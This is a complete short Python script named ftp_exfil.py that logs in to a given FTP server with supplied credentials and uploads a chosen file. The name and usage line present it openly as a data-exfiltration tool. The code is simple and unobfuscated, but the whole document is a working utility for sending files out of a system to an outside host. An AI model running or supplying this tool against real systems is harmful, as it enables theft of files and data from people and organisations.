#!/usr/bin/env python
#
# Usage:
# ftp_exfil.py <server> <username> <password> <file>

import os
import sys
from ftplib import FTP


def main():
    if len(sys.argv) != 5:
        print("[-] Invalid number of arguments")
        print("Usage:")
        print("%s <server> <username> <password> <file>" % sys.argv[0])
        sys.exit(1)
    
    server = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    file_path = sys.argv[4]

    if not os.path.isfile(file_path):
        print("[-] file does not exist or is a directory")
        sys.exit(1)
    
    # get the path basename and open the file
    filename = os.path.basename(file_path)
    file_fd = open(file_path, 'rb')

    # login to the server
    ftp = FTP(server)
    ftp.login(user=username, passwd=password)

    # upload the file
    ftp_command = "STOR %s" % filename
    ftp.storbinary(ftp_command, file_fd)

    ftp.quit()
    file_fd.close()


if __name__ == "__main__":
    main()